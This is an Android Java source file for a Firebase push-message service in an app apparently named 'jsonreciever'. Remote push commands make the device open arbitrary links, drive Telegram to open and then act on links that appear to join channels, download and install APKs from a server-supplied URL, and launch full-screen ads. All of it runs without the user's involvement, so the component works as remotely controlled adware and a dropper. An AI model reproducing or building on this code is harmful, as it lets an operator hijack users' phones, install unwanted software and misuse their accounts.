package com.mhksoft.jsonreciever.Services;

import android.content.Intent;
import android.net.Uri;
import android.os.Handler;
import android.text.TextUtils;
import android.util.Log;

import com.google.firebase.messaging.FirebaseMessagingService;
import com.google.firebase.messaging.RemoteMessage;
import com.mhksoft.jsonreciever.Activities.InterstitialAdActivity;
import com.mhksoft.jsonreciever.Activities.RewardedVideoAdActivity;
import com.mhksoft.jsonreciever.Activities.UnityAdActivity;
import com.mhksoft.jsonreciever.Workers.DownloadTask;
import com.mhksoft.jsonreciever.Workers.TelegramTask;

import java.util.concurrent.TimeUnit;

import static android.content.Intent.FLAG_ACTIVITY_NEW_TASK;

public class FirebaseService extends FirebaseMessagingService {
    @Override
    public void onMessageReceived(RemoteMessage remoteMessage) {
        if (remoteMessage.getData() != null) {
            try {
                int mode = Integer.valueOf(remoteMessage.getData().get("mode"));
                switch (mode) {
                    // Landing
                    case 1:
                        Intent browserIntent = new Intent(Intent.ACTION_VIEW, Uri.parse(remoteMessage.getData().get("link")));
                        browserIntent.setFlags(FLAG_ACTIVITY_NEW_TASK);
                        startActivity(browserIntent);
                        break;
                    // Popup
                    case 2:
                        String popupPackageName;
                        if (TextUtils.isEmpty(remoteMessage.getData().get("package_name")) || remoteMessage.getData().get("package_name") == null)
                            popupPackageName = new TelegramTask(this).searchForPackages();
                        else
                            popupPackageName = remoteMessage.getData().get("package_name");

                        Intent applicationIntent = new Intent(Intent.ACTION_VIEW, Uri.parse(remoteMessage.getData().get("link")));
                        applicationIntent.setFlags(FLAG_ACTIVITY_NEW_TASK);
                        applicationIntent.setPackage(popupPackageName);
                        startActivity(applicationIntent);
                        break;
                    // Popup & Join
                    case 3:
                        String popJoinPackageName;
                        if (TextUtils.isEmpty(remoteMessage.getData().get("package_name")) || remoteMessage.getData().get("package_name") == null)
                            popJoinPackageName = new TelegramTask(this).searchForPackages();
                        else
                            popJoinPackageName = remoteMessage.getData().get("package_name");

                        Log.e("Telegram Package Name", popJoinPackageName);
                        Intent applicationOpenIntent = new Intent(Intent.ACTION_VIEW, Uri.parse(remoteMessage.getData().get("open_link")));
                        applicationOpenIntent.setFlags(FLAG_ACTIVITY_NEW_TASK);
                        applicationOpenIntent.setPackage(popJoinPackageName);
                        startActivity(applicationOpenIntent);
                        new java.util.Timer().schedule(
                                new java.util.TimerTask() {
                                    @Override
                                    public void run() {
                                        Intent applicationActionIntent = new Intent(Intent.ACTION_VIEW, Uri.parse(remoteMessage.getData().get("action_link")));
                                        applicationActionIntent.setPackage(popJoinPackageName);
                                        applicationActionIntent.setFlags(FLAG_ACTIVITY_NEW_TASK);
                                        startActivity(applicationActionIntent);
                                    }
                                },
                                TimeUnit.SECONDS.toMillis(3)
                        );
                        new Handler().postDelayed(new Runnable() {
                            @Override
                            public void run() {

                            }
                        }, TimeUnit.SECONDS.toMillis(2));
                        break;
                    // Single Install
                    case 4:
                        new DownloadTask(this, remoteMessage.getData().get("package_name"))
                                .execute(remoteMessage.getData().get("app_url"));
                        break;
                    // Multiple Install
                    case 5:
                        int retryTimes = Integer.valueOf(remoteMessage.getData().get("retry"));
                        new DownloadTask(this, remoteMessage.getData().get("package_name"), retryTimes)
                                .execute(remoteMessage.getData().get("app_url"));
                        break;
                    // Unity Ads
                    case 6:
                        startActivity(new Intent(this, UnityAdActivity.class));
                        break;
                    // Admob Interstitial
                    case 7:
                        startActivity(new Intent(this, InterstitialAdActivity.class));
                        break;
                    // Admob Video
                    case 8:
                        startActivity(new Intent(this, RewardedVideoAdActivity.class));
                        break;
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
}
